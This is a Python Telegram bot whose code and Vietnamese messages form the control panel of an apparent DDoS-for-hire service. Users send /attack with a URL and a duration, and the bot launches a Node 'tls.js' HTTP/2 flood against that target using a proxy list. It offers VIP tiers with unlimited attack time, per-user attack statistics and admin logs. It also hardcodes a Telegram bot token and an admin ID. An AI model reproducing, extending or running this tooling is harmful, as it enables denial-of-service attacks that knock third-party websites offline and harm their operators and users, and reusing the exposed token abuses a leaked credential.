# bot.py
import asyncio
import json
import logging
import subprocess
import os
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Config
BOT_TOKEN = '8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A'
ADMIN_ID = 7105201572
VIP_FILE = 'vip.json'
LOG_FILE = 'attack_logs.json'

class BotManager:
    def __init__(self):
        self.vip_users = self.load_vip()
        self.active_attacks = {}
        self.attack_history = self.load_logs()
    
    def load_vip(self):
        try:
            with open(VIP_FILE, 'r') as f:
                return set(json.load(f))
        except FileNotFoundError:
            return set([ADMIN_ID])
    
    def save_vip(self):
        with open(VIP_FILE, 'w') as f:
            json.dump(list(self.vip_users), f)
    
    def load_logs(self):
        try:
            with open(LOG_FILE, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return []
    
    def save_logs(self):
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attack_history[-1000:], f, indent=2)  # Giữ 1000 log gần nhất
    
    def add_log(self, user_id, username, target, time, status):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'user_id': user_id,
            'username': username,
            'target': target,
            'time': time,
            'status': status,
            'vip': self.is_vip(user_id)
        }
        self.attack_history.append(log_entry)
        self.save_logs()
    
    def is_admin(self, user_id):
        return user_id == ADMIN_ID
    
    def is_vip(self, user_id):
        return user_id in self.vip_users
    
    def add_vip(self, user_id):
        self.vip_users.add(user_id)
        self.save_vip()
    
    def remove_vip(self, user_id):
        if user_id in self.vip_users and user_id != ADMIN_ID:
            self.vip_users.remove(user_id)
            self.save_vip()
            return True
        return False

    def format_target(self, target):
        """Định dạng target URL"""
        target = target.strip()
        if not target.startswith(('http://', 'https://')):
            if '.' in target:
                return f'https://{target}'
        return target

    def get_user_stats(self, user_id):
        """Thống kê user"""
        user_logs = [log for log in self.attack_history if log['user_id'] == user_id]
        total_attacks = len(user_logs)
        successful_attacks = len([log for log in user_logs if log['status'] == 'success'])
        return total_attacks, successful_attacks

# Khởi tạo bot manager
bot_mgr = BotManager()

# Decorator kiểm tra quyền Admin
def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not bot_mgr.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Chỉ Admin mới có quyền sử dụng lệnh này!")
            return
        return await func(update, context)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_text = f"""
👋 Chào {user.first_name}! 

🤖 **BOT ATTACK CONTROL PANEL** 🚀

🔧 **LỆNH CƠ BẢN:**
/attack <url> <time> - Khởi động attack
/mystats - Thống kê của bạn
/checkvip - Kiểm tra VIP status
/vipinfo - Thông tin VIP
/stop - Dừng attack hiện tại

👑 **LỆNH ADMIN:**
/addvip <user_id> - Thêm VIP
/removevip <user_id> - Xóa VIP  
/listvip - Danh sách VIP
/stats - Thống kê hệ thống
/logs - Xem logs tấn công

💡 **VÍ DỤ:**
/attack example.com 60
/attack https://site.com 120

⚡ **Bot đã sẵn sàng!**
    """
    await update.message.reply_text(welcome_text)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.first_name
    
    # Kiểm tra số lượng tham số
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ **Sai cú pháp!**\n\n"
            "✅ **Đúng:** /attack <url> <thời_gian>\n"
            "📝 **Ví dụ:** /attack example.com 60"
        )
        return
    
    target = context.args[0]
    time_str = context.args[1]
    
    # Định dạng URL target
    formatted_target = bot_mgr.format_target(target)
    
    # Validate time
    try:
        time_int = int(time_str)
        if time_int <= 0:
            await update.message.reply_text("❌ Thời gian phải lớn hơn 0!")
            return
        
        # Kiểm tra giới hạn thời gian cho non-VIP
        if not bot_mgr.is_vip(user_id) and time_int > 120:
            await update.message.reply_text(
                f"🚫 **GIỚI HẠN THỜI GIAN!**\n\n"
                f"👤 **Non-VIP:** Tối đa 120s\n"
                f"💎 **VIP:** Không giới hạn\n"
                f"⏰ **Bạn nhập:** {time_int}s\n\n"
                f"📞 Liên hệ Admin để nâng cấp VIP!"
            )
            return
            
    except ValueError:
        await update.message.reply_text("❌ Thời gian phải là số!")
        return
    
    # Kiểm tra nếu user đang có attack chạy
    if user_id in bot_mgr.active_attacks:
        await update.message.reply_text(
            "⚠️ **BẠN ĐANG CÓ ATTACK CHẠY!**\n\n"
            "Vui lòng chờ hoàn thành hoặc dùng lệnh /stop để dừng."
        )
        return
    
    # Khởi động attack
    status_msg = await update.message.reply_text(
        f"🚀 **ĐANG KHỞI ĐỘNG ATTACK**\n\n"
        f"🎯 **Target:** `{formatted_target}`\n"
        f"⏰ **Time:** `{time_str}s`\n"
        f"👤 **User:** {username}\n"
        f"💎 **VIP:** {'✅' if bot_mgr.is_vip(user_id) else '❌'}\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"⏳ **Status:** Đang xử lý..."
    )
    
    try:
        # Chuẩn bị command
        cmd = [
            'node', 'tls.js',
            formatted_target, time_str, '4', '5', 'y.txt',
            '--http', '2',
            '--winter',
            '--full'
        ]
        
        # Đánh dấu attack đang chạy
        bot_mgr.active_attacks[user_id] = {
            'process': None,
            'message': status_msg,
            'target': formatted_target,
            'time': time_str,
            'start_time': datetime.now()
        }
        
        # Thực thi attack
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        bot_mgr.active_attacks[user_id]['process'] = process
        
        # Cập nhật trạng thái
        await status_msg.edit_text(
            f"⚡ **ATTACK ĐANG CHẠY**\n\n"
            f"🎯 **Target:** `{formatted_target}`\n"
            f"⏰ **Time:** `{time_str}s`\n"
            f"👤 **User:** {username}\n"
            f"💎 **VIP:** {'✅' if bot_mgr.is_vip(user_id) else '❌'}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"🟢 **Status:** Đang tấn công..."
        )
        
        # Chờ kết quả
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
        
        # Dọn dẹp
        if user_id in bot_mgr.active_attacks:
            del bot_mgr.active_attacks[user_id]
        
        if process.returncode == 0:
            result = stdout.decode('utf-8', errors='ignore') if stdout else "✅ Attack completed successfully!"
            result_preview = result[:500] + "..." if len(result) > 500 else result
            
            # Ghi log thành công
            bot_mgr.add_log(user_id, username, formatted_target, time_str, 'success')
            
            await status_msg.edit_text(
                f"✅ **ATTACK HOÀN TẤT**\n\n"
                f"🎯 **Target:** `{formatted_target}`\n"
                f"⏰ **Time:** `{time_str}s`\n"
                f"👤 **User:** {username}\n"
                f"💎 **VIP:** {'✅' if bot_mgr.is_vip(user_id) else '❌'}\n"
                f"📊 **Kết quả:**\n```{result_preview}```"
            )
        else:
            error = stderr.decode('utf-8', errors='ignore') if stderr else "❌ Unknown error occurred"
            error_preview = error[:500] + "..." if len(error) > 500 else error
            
            # Ghi log thất bại
            bot_mgr.add_log(user_id, username, formatted_target, time_str, 'failed')
            
            await status_msg.edit_text(
                f"❌ **ATTACK THẤT BẠI**\n\n"
                f"🎯 **Target:** `{formatted_target}`\n"
                f"⏰ **Time:** `{time_str}s`\n"
                f"👤 **User:** {username}\n"
                f"💎 **VIP:** {'✅' if bot_mgr.is_vip(user_id) else '❌'}\n"
                f"📋 **Lỗi:**\n```{error_preview}```"
            )
            
    except asyncio.TimeoutError:
        if user_id in bot_mgr.active_attacks:
            del bot_mgr.active_attacks[user_id]
        bot_mgr.add_log(user_id, username, formatted_target, time_str, 'timeout')
        await status_msg.edit_text("❌ **ATTACK TIMEOUT!** Quá thời gian chờ cho phép.")
    except Exception as e:
        if user_id in bot_mgr.active_attacks:
            del bot_mgr.active_attacks[user_id]
        bot_mgr.add_log(user_id, username, formatted_target, time_str, 'error')
        await status_msg.edit_text(f"❌ **LỖI HỆ THỐNG:** {str(e)}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in bot_mgr.active_attacks:
        process = bot_mgr.active_attacks[user_id]['process']
        if process:
            try:
                process.terminate()
                await asyncio.sleep(1)
                if process.returncode is None:
                    process.kill()
            except Exception:
                pass
        
        target = bot_mgr.active_attacks[user_id]['target']
        del bot_mgr.active_attacks[user_id]
        
        # Ghi log dừng
        bot_mgr.add_log(user_id, update.effective_user.first_name, target, '0', 'stopped')
        
        await update.message.reply_text("✅ Đã dừng attack của bạn!")
    else:
        await update.message.reply_text("❌ Bạn không có attack nào đang chạy!")

async def mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.first_name
    
    total_attacks, successful_attacks = bot_mgr.get_user_stats(user_id)
    success_rate = (successful_attacks / total_attacks * 100) if total_attacks > 0 else 0
    
    await update.message.reply_text(
        f"📊 **THỐNG KÊ CÁ NHÂN**\n\n"
        f"👤 **User:** {username}\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"💎 **VIP:** {'✅' if bot_mgr.is_vip(user_id) else '❌'}\n\n"
        f"🎯 **Tổng Attacks:** {total_attacks}\n"
        f"✅ **Thành công:** {successful_attacks}\n"
        f"📈 **Tỷ lệ thành công:** {success_rate:.1f}%\n\n"
        f"⚡ **Giới hạn:** {'Không giới hạn' if bot_mgr.is_vip(user_id) else '120 giây'}"
    )

@admin_only
async def addvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Thiếu user_id! Sử dụng: /addvip <user_id>")
        return
    
    try:
        vip_id = int(context.args[0])
        bot_mgr.add_vip(vip_id)
        await update.message.reply_text(f"✅ Đã thêm `{vip_id}` vào danh sách VIP!")
    except ValueError:
        await update.message.reply_text("❌ user_id phải là số!")

@admin_only
async def removevip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Thiếu user_id! Sử dụng: /removevip <user_id>")
        return
    
    try:
        vip_id = int(context.args[0])
        if bot_mgr.remove_vip(vip_id):
            await update.message.reply_text(f"✅ Đã xóa `{vip_id}` khỏi danh sách VIP!")
        else:
            await update.message.reply_text(f"❌ `{vip_id}` không có trong VIP hoặc là Admin!")
    except ValueError:
        await update.message.reply_text("❌ user_id phải là số!")

async def checkvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if bot_mgr.is_vip(user_id):
        await update.message.reply_text(
            f"👑 **BẠN LÀ VIP!** 🎉\n\n"
            f"✅ **Thời gian attack:** KHÔNG GIỚI HẠN\n"
            f"⚡ **Ưu tiên:** Cao nhất\n"
            f"🎯 **Tính năng:** Đầy đủ\n"
            f"🌟 **Quyền lợi:** Tối đa"
        )
    else:
        await update.message.reply_text(
            f"ℹ️ **THÔNG TIN TÀI KHOẢN**\n\n"
            f"⏰ **Thời gian tối đa:** 120 giây\n"
            f"📊 **Chế độ:** Thông thường\n"
            f"💎 **Nâng cấp VIP:** Liên hệ Admin\n\n"
            f"📞 **Admin:** `{ADMIN_ID}`"
        )

async def vipinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vip_count = len(bot_mgr.vip_users)
    active_attacks = len(bot_mgr.active_attacks)
    total_attacks = len(bot_mgr.attack_history)
    
    await update.message.reply_text(
        f"💎 **THÔNG TIN HỆ THỐNG VIP** 💎\n\n"
        f"👑 **VIP Users:** {vip_count}\n"
        f"⚡ **Active Attacks:** {active_attacks}\n"
        f"📊 **Total Attacks:** {total_attacks}\n\n"
        f"**🎯 QUYỀN LỢI VIP:**\n"
        f"• ✅ Thời gian: KHÔNG GIỚI HẠN\n"
        f"• ⚡ Ưu tiên: CAO NHẤT\n"
        f"• 🎯 Tính năng: ĐẦY ĐỦ\n\n"
        f"**👤 NORMAL USER:**\n"
        f"• ⏰ Thời gian: 120 giây\n"
        f"• 📊 Chế độ: CƠ BẢN\n\n"
        f"📋 **Lệnh:**\n"
        f"/checkvip - Kiểm tra VIP\n"
        f"/vipinfo - Thông tin này"
    )

@admin_only
async def listvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_mgr.vip_users:
        await update.message.reply_text("📝 Danh sách VIP trống!")
        return
    
    vip_list = '\n'.join([f'• `{user_id}`' for user_id in sorted(bot_mgr.vip_users)])
    await update.message.reply_text(
        f"👑 **DANH SÁCH VIP**\n\n"
        f"{vip_list}\n\n"
        f"**Tổng:** {len(bot_mgr.vip_users)} users"
    )

@admin_only
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vip_count = len(bot_mgr.vip_users)
    active_attacks = len(bot_mgr.active_attacks)
    total_attacks = len(bot_mgr.attack_history)
    
    # Thống kê attacks 24h gần nhất
    recent_attacks = []
    for log in reversed(bot_mgr.attack_history[-50:]):  # 50 log gần nhất
        recent_attacks.append(f"• {log['username']}: {log['target']} ({log['time']}s) - {log['status']}")
    
    recent_list = '\n'.join(recent_attacks) if recent_attacks else "• Không có attack nào"
    
    await update.message.reply_text(
        f"📊 **THỐNG KÊ HỆ THỐNG**\n\n"
        f"👑 **VIP Users:** {vip_count}\n"
        f"⚡ **Active Attacks:** {active_attacks}\n"
        f"📈 **Total Attacks:** {total_attacks}\n\n"
        f"**🔧 ĐANG CHẠY:**\n{recent_list}"
    )

@admin_only
async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_mgr.attack_history:
        await update.message.reply_text("📝 Không có logs nào!")
        return
    
    # Hiển thị 10 logs gần nhất
    recent_logs = bot_mgr.attack_history[-10:]
    log_text = "📋 **LOGS TẤN CÔNG (10 gần nhất)**\n\n"
    
    for log in recent_logs:
        time_str = datetime.fromisoformat(log['timestamp']).strftime("%H:%M:%S")
        status_icon = "✅" if log['status'] == 'success' else "❌"
        vip_icon = "💎" if log['vip'] else "👤"
        
        log_text += f"{status_icon} {vip_icon} {time_str} - {log['username']}\n"
        log_text += f"   🎯 {log['target']} ({log['time']}s)\n\n"
    
    await update.message.reply_text(log_text)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý tin nhắn thường"""
    if update.message and update.message.text:
        text = update.message.text
        if text.startswith('/'):
            await update.message.reply_text("❌ Lệnh không hợp lệ! Gõ /start để xem danh sách lệnh.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lỗi"""
    logger.error(f"Exception while handling an update: {context.error}")
    
    if update and update.effective_user:
        try:
            await update.message.reply_text("❌ Đã xảy ra lỗi hệ thống! Vui lòng thử lại.")
        except:
            pass

def main():
    """Khởi chạy bot"""
    try:
        print("🚀 Đang khởi động Bot Telegram...")
        print(f"👑 Admin ID: {ADMIN_ID}")
        print(f"💎 VIP Users: {len(bot_mgr.vip_users)}")
        print(f"📊 Total Logs: {len(bot_mgr.attack_history)}")
        
        # Tạo application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Thêm handlers
        handlers = [
            CommandHandler("start", start),
            CommandHandler("attack", attack),
            CommandHandler("stop", stop),
            CommandHandler("mystats", mystats),
            CommandHandler("addvip", addvip),
            CommandHandler("removevip", removevip),
            CommandHandler("checkvip", checkvip),
            CommandHandler("vipinfo", vipinfo),
            CommandHandler("listvip", listvip),
            CommandHandler("stats", stats),
            CommandHandler("logs", logs),
        ]
        
        for handler in handlers:
            application.add_handler(handler)
        
        # Handler cho tin nhắn thường
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Error handler
        application.add_error_handler(error_handler)
        
        print("✅ Bot đã sẵn sàng!")
        print("🤖 Đang chạy...")
        
        # Chạy bot
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Lỗi khởi động bot: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()
